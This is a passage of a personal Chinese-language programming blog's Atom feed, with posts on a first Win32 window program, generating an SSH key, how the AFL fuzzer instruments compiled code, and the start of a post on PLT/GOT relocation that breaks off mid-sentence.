<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-04T16:54:12+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Triangleowl’s Blog</title><subtitle>Hello World!
</subtitle><author><name>triangleowl</name></author><entry><title type="html">第一个window程序</title><link href="http://localhost:4000/windows/first-window" rel="alternate" type="text/html" title="第一个window程序" /><published>2020-04-04T00:00:00+08:00</published><updated>2020-04-04T00:00:00+08:00</updated><id>http://localhost:4000/windows/first-window</id><content type="html" xml:base="http://localhost:4000/windows/first-window">&lt;h3 id=&quot;整体思路&quot;&gt;整体思路&lt;/h3&gt;
&lt;p&gt;编写window程序的步骤如下：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;定义一个 &lt;code class=&quot;highlighter-rouge&quot;&gt;WNDCLASS&lt;/code&gt;,并对其成员赋值；&lt;/li&gt;
  &lt;li&gt;调用 &lt;code class=&quot;highlighter-rouge&quot;&gt;RegisterClass&lt;/code&gt; 注册定义的 &lt;code class=&quot;highlighter-rouge&quot;&gt;WNDCLASS&lt;/code&gt;；&lt;/li&gt;
  &lt;li&gt;调用 &lt;code class=&quot;highlighter-rouge&quot;&gt;CreateWindow&lt;/code&gt; 创建一个 window；&lt;/li&gt;
  &lt;li&gt;调用 &lt;code class=&quot;highlighter-rouge&quot;&gt;ShowWindow&lt;/code&gt; 显示创建的 window&lt;/li&gt;
  &lt;li&gt;接受键盘、鼠标数据&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;定义一个-wndclass&quot;&gt;定义一个 &lt;code class=&quot;highlighter-rouge&quot;&gt;WNDCLASS&lt;/code&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;typedef struct {
    UINT style;
    WNDPROC lpfnWndProc;
    int cbClsExtra;
    int cbWndExtra;
    HINSTANCE hInstance;
    HICON hIcon;
    HCURSOR hCursor;
    HBRUSH hbrBackground;
    LPCTSTR lpszMenuName;
    LPCTSTR lpszClassName;
} WNDCLASS, *PWNDCLASS;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据 &lt;code class=&quot;highlighter-rouge&quot;&gt;MSDN&lt;/code&gt; 介绍，不必对&lt;code class=&quot;highlighter-rouge&quot;&gt;WNDCLASS&lt;/code&gt;的每个成员都定义，只需要对三个成员定义即可.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/Triangleowl/picture/blob/master/first-window/WNDCLASS.png&quot; alt=&quot;MSDN手册&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;注册wndclass&quot;&gt;注册&lt;code class=&quot;highlighter-rouge&quot;&gt;WNDCLASS&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;调用&lt;code class=&quot;highlighter-rouge&quot;&gt;RegisterClass&lt;/code&gt;即可。&lt;/p&gt;

&lt;h3 id=&quot;创建window&quot;&gt;创建window&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CreateWindow&lt;/code&gt;的参数比较多，无用的参数赋值为0或者NULL即可。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;HWND CreateWindow(          LPCTSTR lpClassName,
    LPCTSTR lpWindowName,
    DWORD dwStyle,
    int x,
    int y,
    int nWidth,
    int nHeight,
    HWND hWndParent,
    HMENU hMenu,
    HINSTANCE hInstance,
    LPVOID lpParam
);
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;显示-window&quot;&gt;显示 window&lt;/h3&gt;
&lt;p&gt;调用&lt;code class=&quot;highlighter-rouge&quot;&gt;ShowWindow&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;UpdateWindow&lt;/code&gt;即可。&lt;/p&gt;

&lt;h3 id=&quot;编写-windowproc函数&quot;&gt;编写 &lt;code class=&quot;highlighter-rouge&quot;&gt;WindowProc&lt;/code&gt;函数&lt;/h3&gt;
&lt;p&gt;为了能够交互，窗口应该能接受鼠标和键盘消息。按照要求，&lt;code class=&quot;highlighter-rouge&quot;&gt;WindowProc&lt;/code&gt;函数的原型如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;LRESULT CALLBACK WindowProc(          HWND hwnd,
    UINT uMsg,
    WPARAM wParam,
    LPARAM lParam
);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;具体的编程查询&lt;code class=&quot;highlighter-rouge&quot;&gt;MSDN&lt;/code&gt;或者&lt;code class=&quot;highlighter-rouge&quot;&gt;MicroSoft&lt;/code&gt;的&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/learnwin32/your-first-windows-program&quot; title=&quot;第一个window程序&quot;&gt;在线文档&lt;/a&gt;&lt;/p&gt;</content><author><name>Triangleowl</name></author><summary type="html">整体思路 编写window程序的步骤如下： 定义一个 WNDCLASS,并对其成员赋值； 调用 RegisterClass 注册定义的 WNDCLASS； 调用 CreateWindow 创建一个 window； 调用 ShowWindow 显示创建的 window 接受键盘、鼠标数据 定义一个 WNDCLASS typedef struct { UINT style; WNDPROC lpfnWndProc; int cbClsExtra; int cbWndExtra; HINSTANCE hInstance; HICON hIcon; HCURSOR hCursor; HBRUSH hbrBackground; LPCTSTR lpszMenuName; LPCTSTR lpszClassName; } WNDCLASS, *PWNDCLASS; 根据 MSDN 介绍，不必对WNDCLASS的每个成员都定义，只需要对三个成员定义即可. 注册WNDCLASS 调用RegisterClass即可。 创建window CreateWindow的参数比较多，无用的参数赋值为0或者NULL即可。 HWND CreateWindow( LPCTSTR lpClassName, LPCTSTR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam ); 显示 window 调用ShowWindow和UpdateWindow即可。 编写 WindowProc函数 为了能够交互，窗口应该能接受鼠标和键盘消息。按照要求，WindowProc函数的原型如下： LRESULT CALLBACK WindowProc( HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam ); 具体的编程查询MSDN或者MicroSoft的在线文档</summary></entry><entry><title type="html">生成 SSH 公钥</title><link href="http://localhost:4000/git/git-public-key" rel="alternate" type="text/html" title="生成 SSH 公钥" /><published>2020-04-04T00:00:00+08:00</published><updated>2020-04-04T00:00:00+08:00</updated><id>http://localhost:4000/git/git-public-key</id><content type="html" xml:base="http://localhost:4000/git/git-public-key">&lt;p&gt;生成 &lt;code class=&quot;highlighter-rouge&quot;&gt;git&lt;/code&gt; 公钥如下：&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh-keygen
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;执行结果：&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh-keygen
Generating public/private rsa key pair.
Enter file &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;which to save the key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/home/sl/.ssh/id_rsa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 
Enter passphrase &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;empty &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;no passphrase&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 
Enter same passphrase again: 
Your identification has been saved &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /home/sl/.ssh/id_rsa.
Your public key has been saved &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /home/sl/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:XXXrY7BeVPe6Sx3ZPXXXI/7pZS9DWT7SOXXXeO/TY+M sl@thinkpad
The key&lt;span class=&quot;s1&quot;&gt;'s randomart image is:
+---[RSA 2048]----+
|   .... .        |
|  ..o  . .       |
|   +..    . . o  |
|  . *. . . + + o.|
| . + .. S o o +++|
|  .      o . oo@.|
|        o . ..O B|
|       . . . .o%o|
|        .   .o*E=|
+----[SHA256]-----+

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后进入 ~/.ssh 目录，将&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;config  id_rsa  id_rsa.pub  known_hosts

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;id_rsa.pub
    ......
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将id_rsa.pub内的内容全部拷贝到github上，点击添加即可。&lt;/p&gt;</content><author><name>Triangleowl</name></author><summary type="html">生成 git 公钥如下：</summary></entry><entry><title type="html">AFL 源码码插桩分析</title><link href="http://localhost:4000/fuzzing/AFL-instrunmentation" rel="alternate" type="text/html" title="AFL 源码码插桩分析" /><published>2019-11-23T00:00:00+08:00</published><updated>2019-11-23T00:00:00+08:00</updated><id>http://localhost:4000/fuzzing/AFL-instrunmentation</id><content type="html" xml:base="http://localhost:4000/fuzzing/AFL-instrunmentation">&lt;h2 id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h2&gt;
&lt;h4 id=&quot;afl-gcc分析-&quot;&gt;&lt;a href=&quot;#afl-gcc分析&quot;&gt;afl-gcc分析 &lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;afl-as分析-&quot;&gt;&lt;a href=&quot;#afl-as分析&quot;&gt;afl-as分析 &lt;/a&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;查找代码部分-&quot;&gt;&lt;a href=&quot;#查找代码部分&quot;&gt;查找代码部分 &lt;/a&gt;&lt;/h4&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;查找-basic-block-&quot;&gt;&lt;a href=&quot;#查找-basic-block&quot;&gt;查找 basic block &lt;/a&gt;&lt;/h4&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;忽略插桩部分-&quot;&gt;&lt;a href=&quot;#忽略插桩部分&quot;&gt;忽略插桩部分 &lt;/a&gt;&lt;/h4&gt;
    &lt;hr /&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;afl-gcc分析&quot;&gt;&lt;a href=&quot;#afl-gcc分析&quot;&gt;afl-gcc分析&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;AFL&lt;/code&gt; 既可以对源代码进行插桩也可以结合 &lt;code class=&quot;highlighter-rouge&quot;&gt;QEMU&lt;/code&gt; 对二进制进行插桩，本问主要针对 &lt;code class=&quot;highlighter-rouge&quot;&gt;AFL&lt;/code&gt; 的源码插桩进行分析。&lt;/p&gt;

&lt;p&gt;我们都知道&lt;code class=&quot;highlighter-rouge&quot;&gt;C&lt;/code&gt;程序从源代码到可执行文件要经过四个步骤：&lt;code class=&quot;highlighter-rouge&quot;&gt;预处理&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;编译&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;汇编&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;链接&lt;/code&gt;。每个步骤的工作可以概括如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;预处理阶段&lt;/strong&gt;. 预处理器(&lt;code class=&quot;highlighter-rouge&quot;&gt;cpp&lt;/code&gt;)根据以 &lt;em&gt;&lt;strong&gt;#&lt;/strong&gt;&lt;/em&gt; 开头的代码来修改原始的C程序。比如 &lt;em&gt;hello world&lt;/em&gt; 程序将 &lt;em&gt;#include&lt;/em&gt; 命令告诉预处理器读取 &lt;em&gt;stdio.h&lt;/em&gt; 的内容，并插入到 &lt;em&gt;hello world&lt;/em&gt; 程序中生成 &lt;em&gt;hello.i&lt;/em&gt; 文件。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;编译阶段&lt;/strong&gt;. 编译器(&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1&lt;/code&gt;)将 &lt;em&gt;hello.i&lt;/em&gt; 文件翻译成汇编文件 &lt;em&gt;hello.s&lt;/em&gt;。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;汇编阶段&lt;/strong&gt;. 汇编器(&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;)将 &lt;em&gt;hello.s&lt;/em&gt; 文件中的汇编指令翻译成机器语言指令，并把这些指令打包成_可重定位目标文件_，并按照&lt;code class=&quot;highlighter-rouge&quot;&gt;ELF&lt;/code&gt;文件格式生成 &lt;em&gt;hello.o&lt;/em&gt; 文件。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;链接阶段&lt;/strong&gt;. &lt;em&gt;hello world&lt;/em&gt; 程序调用了 &lt;em&gt;printf&lt;/em&gt; 函数，但是我们的源文件里并没有这个函数的代码，它是一个C语言标准库里的代码。链接阶段就由连接器(&lt;code class=&quot;highlighter-rouge&quot;&gt;ld&lt;/code&gt;)来确定 &lt;em&gt;printf&lt;/em&gt; 函数的地址，从而确保程序在执行时能正确调用 &lt;em&gt;printf&lt;/em&gt; 函数。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc&lt;/code&gt;其实也是上面几个工具的一个wrapper，首先&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc&lt;/code&gt;会调用&lt;code class=&quot;highlighter-rouge&quot;&gt;cpp&lt;/code&gt;对代码进行预处理，然后将预处理后的文件交给&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1&lt;/code&gt;执行编译生成汇编文件，汇编器&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;将汇编文件作为输入生成机器码–目标文件，最后由连接器&lt;code class=&quot;highlighter-rouge&quot;&gt;ld&lt;/code&gt;将目标文件链接生成可执行文件。&lt;/p&gt;

&lt;p&gt;AFL 实际上是在在编译过程完成后汇编过程之前对汇编文件进行插桩的，AFL 使用&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-gcc&lt;/code&gt;对C/C++程序源码进行插桩(afl-g++是afl-gcc的一个链接)。而&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-gcc&lt;/code&gt;又是&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc/g++&lt;/code&gt;的wrapper,&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-gcc&lt;/code&gt;设置&lt;code class=&quot;highlighter-rouge&quot;&gt;-B direcotry&lt;/code&gt;后再调用&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc/g++&lt;/code&gt;。&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-gcc&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;函数如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/*
afl-gcc.c:main()
*/

find_as(argv[0]); //查找argv[0]的目录(即afl-gcc的目录)供 edit_params()函数使用

edit_params(argc, argv); //设置 -B 选项和参数

execvp(cc_params[0], (char**)cc_params); //调用 gcc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;而&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc/g++&lt;/code&gt;又是&lt;code class=&quot;highlighter-rouge&quot;&gt;cpp&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1/cc1plus&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;ld&lt;/code&gt;的wrapper,&lt;code class=&quot;highlighter-rouge&quot;&gt;-B directory&lt;/code&gt;的作用是让&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc/g++&lt;/code&gt;首先在 &lt;em&gt;directory&lt;/em&gt; 查找&lt;code class=&quot;highlighter-rouge&quot;&gt;cpp&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1/cc1plus&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;ld&lt;/code&gt;。&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-gcc&lt;/code&gt;将 &lt;em&gt;direcotry&lt;/em&gt; 设置为afl-gcc所在的目录，当进行预处理和编译时到 &lt;em&gt;direcotry&lt;/em&gt; 找不到&lt;code class=&quot;highlighter-rouge&quot;&gt;cpp&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1/cc1plus&lt;/code&gt;就会使用默认的&lt;code class=&quot;highlighter-rouge&quot;&gt;cpp&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1/cc1plus&lt;/code&gt;。而当&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1/cc1plus&lt;/code&gt;编译完成后在 &lt;em&gt;direcotry&lt;/em&gt; 查找汇编器 &lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;，刚好 &lt;em&gt;dircotry&lt;/em&gt; 有&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;(这个&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;其实是&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt;的链接)。接下来就是使用&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt;对汇编代码插桩。&lt;/p&gt;

&lt;h3 id=&quot;afl-as分析&quot;&gt;&lt;a href=&quot;#afl-as分析&quot;&gt;afl-as分析&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt;是&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;的wrapper，&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt;会在汇编代码的代码相应位置插入统计代码，然后调用真正的&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;进行汇编。统计代码是在&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as.h&lt;/code&gt;文件中，&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt;负责找到每个 &lt;em&gt;basic block&lt;/em&gt; 插入 &lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as.h&lt;/code&gt;中的统计代码。&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as.c:main()&lt;/code&gt;主要调用了两个函数：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/*
afl-as.c:main()
*/

edit_params(argc, argv); //调整传递给真正的汇编器`as`的参数。

add_instrumentation(); //判断分支，插入统计代码
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;查找代码部分&quot;&gt;&lt;a href=&quot;#查找代码部分&quot;&gt;查找代码部分&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as.c&lt;/code&gt;中最重要的就是 &lt;em&gt;add_instrumentation()&lt;/em&gt; 函数，它只对代码部分进行插桩。具体的代码如下,如果是代码部分则会将 &lt;code class=&quot;highlighter-rouge&quot;&gt;instr_ok&lt;/code&gt; 置1。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (line[0] == '\t' &amp;amp;&amp;amp; line[1] == '.') {

  /* OpenBSD puts jump tables directly inline with the code, which is
     a bit annoying. They use a specific format of p2align directives
     around them, so we use that as a signal. */

  if (!clang_mode &amp;amp;&amp;amp; instr_ok &amp;amp;&amp;amp; !strncmp(line + 2, &quot;p2align &quot;, 8) &amp;amp;&amp;amp;
      isdigit(line[10]) &amp;amp;&amp;amp; line[11] == '\n') skip_next_label = 1;

  if (!strncmp(line + 2, &quot;text\n&quot;, 5) ||
      !strncmp(line + 2, &quot;section\t.text&quot;, 13) ||
      !strncmp(line + 2, &quot;section\t__TEXT,__text&quot;, 21) ||
      !strncmp(line + 2, &quot;section __TEXT,__text&quot;, 21)) {
    instr_ok = 1;
    continue;
  }

  if (!strncmp(line + 2, &quot;section\t&quot;, 8) ||
      !strncmp(line + 2, &quot;section &quot;, 8) ||
      !strncmp(line + 2, &quot;bss\n&quot;, 4) ||
      !strncmp(line + 2, &quot;data\n&quot;, 5)) {
    instr_ok = 0;
    continue;
  }

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;查找-basic-block&quot;&gt;&lt;a href=&quot;#查找-basic-block&quot;&gt;查找 basic block&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt;通过两种方法来查找 &lt;em&gt;basic block&lt;/em&gt;, 一种是通过 &lt;code class=&quot;highlighter-rouge&quot;&gt;标识符&lt;/code&gt;， 另一种是通过条件跳转指令来识别 &lt;em&gt;basic block&lt;/em&gt;。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt; 通过 &lt;code class=&quot;highlighter-rouge&quot;&gt;标识符&lt;/code&gt; 查找 &lt;em&gt;basic block&lt;/em&gt; 的方法很简单，具体是以 “点号”(&lt;code class=&quot;highlighter-rouge&quot;&gt;.&lt;/code&gt;)开始,以“冒号”(&lt;code class=&quot;highlighter-rouge&quot;&gt;:&lt;/code&gt;)结束，中间是字母数字组合。如果找到这种 &lt;code class=&quot;highlighter-rouge&quot;&gt;标识符&lt;/code&gt; 就将 &lt;code class=&quot;highlighter-rouge&quot;&gt;instrument_next&lt;/code&gt; 置1。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (strstr(line, &quot;:&quot;)) {
      if (line[0] == '.') {
          ...
          instrument_next = 1;
      }
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;另外还有一种情况就是产生条件分支的地方，一般是进行比较根据比较结果来决定是否跳转(如 jnz xxx)，但是条件跳转指令的下一条也是一个 &lt;em&gt;basic block&lt;/em&gt; 的开始处，但是没有 &lt;code class=&quot;highlighter-rouge&quot;&gt;标识符&lt;/code&gt;, 所以要通过判断指令本身来决定是否是条件跳转指令，如果是则在在条件跳转指令后插入统计代码。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/* Conditional branch instruction (jnz, etc). We append the instrumentation
   right after the branch (to instrument the not-taken path) and at the
   branch destination label (handled later on). */

if (line[0] == '\t') {

  if (line[1] == 'j' &amp;amp;&amp;amp; line[2] != 'm' &amp;amp;&amp;amp; R(100) &amp;lt; inst_ratio) {

    fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,
            R(MAP_SIZE));

    ins_lines++;

  }

  continue;

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;忽略插桩部分&quot;&gt;&lt;a href=&quot;#忽略插桩部分&quot;&gt;忽略插桩部分&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;afl-as&lt;/code&gt; 并不是对所有的 &lt;em&gt;basic block&lt;/em&gt; 都进行插桩，它会忽略以下集中情况: Intel汇编、源代码内嵌汇编代码。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1/cc1plus&lt;/code&gt;生成的是 &lt;code class=&quot;highlighter-rouge&quot;&gt;AT&amp;amp;T&lt;/code&gt; 汇编，如果发现 &lt;em&gt;.intel_syntax&lt;/em&gt; 则跳过，不对Intel汇编插桩。使用源代码内嵌汇编编程时，生成的汇编代码会在内嵌汇编处用 &lt;em&gt;#APP&lt;/em&gt; 和 &lt;em&gt;#NO_APP&lt;/em&gt; 来标记。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/* Detect syntax changes, as could happen with hand-written assembly.
   Skip Intel blocks, resume instrumentation when back to AT&amp;amp;T. */

if (strstr(line, &quot;.intel_syntax&quot;)) skip_intel = 1;
if (strstr(line, &quot;.att_syntax&quot;)) skip_intel = 0;

/* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */

if (line[0] == '#' || line[1] == '#') {

  if (strstr(line, &quot;#APP&quot;)) skip_app = 1;
  if (strstr(line, &quot;#NO_APP&quot;)) skip_app = 0;

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;AFL&lt;/code&gt; 的插桩过程，具体的插桩指令 &lt;a href=&quot;https://rk700.github.io/2017/12/28/afl-internals/&quot;&gt;AFL内部实现细节小记&lt;/a&gt; 写的非常好。&lt;/p&gt;</content><author><name>Triangleowl</name></author><summary type="html">Table of Contents afl-gcc分析 afl-as分析 查找代码部分 查找 basic block 忽略插桩部分</summary></entry><entry><title type="html">PLT和GOT–实现位置无关代码</title><link href="http://localhost:4000/linux/Position-Independent-Code" rel="alternate" type="text/html" title="PLT和GOT--实现位置无关代码" /><published>2019-11-06T00:00:00+08:00</published><updated>2019-11-06T00:00:00+08:00</updated><id>http://localhost:4000/linux/Position-Independent-Code</id><content type="html" xml:base="http://localhost:4000/linux/Position-Independent-Code">&lt;h4 id=&quot;table-of-contents&quot;&gt;Table Of Contents&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;链接时重定位-&quot;&gt;&lt;a href=&quot;#链接时重定位&quot;&gt;链接时重定位 &lt;/a&gt;&lt;/h4&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;装载时重定位-&quot;&gt;&lt;a href=&quot;#装载时重定位&quot;&gt;装载时重定位 &lt;/a&gt;&lt;/h4&gt;
    &lt;ul&gt;
      &lt;li&gt;
        &lt;h5 id=&quot;模块内部数据访问-&quot;&gt;&lt;a href=&quot;#模块内部数据访问&quot;&gt;模块内部数据访问 &lt;/a&gt;&lt;/h5&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;h5 id=&quot;模块间数据访问-&quot;&gt;&lt;a href=&quot;#模块间数据访问&quot;&gt;模块间数据访问 &lt;/a&gt;&lt;/h5&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;h5 id=&quot;模块间函数调用-&quot;&gt;&lt;a href=&quot;#模块间函数调用&quot;&gt;模块间函数调用 &lt;/a&gt;&lt;/h5&gt;
        &lt;hr /&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;链接时重定位&quot;&gt;&lt;a href=&quot;#链接时重定位&quot;&gt;链接时重定位&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;程序是如何定位来自外部的符号（如引用外部的变量和函数）？ 一个简单的例子如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat test.c
extern int foo;

int function(void)
{
	return foo;
}

#编译程序，生成目标文件test.o
$ gcc -c test.c

#将目标文件反汇编
$ objdump -d test.o
...
00000000 &amp;lt;function&amp;gt;:
   0:	55                   	push   %ebp
   1:	89 e5                	mov    %esp,%ebp
   3:	a1 00 00 00 00       	mov    0x0,%eax
   8:	5d                   	pop    %ebp
   9:	c3                   	ret
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到本来应该将&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的值赋给&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;，但是汇编代码显示将0x0赋给了&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;。这是因为test.o无法定
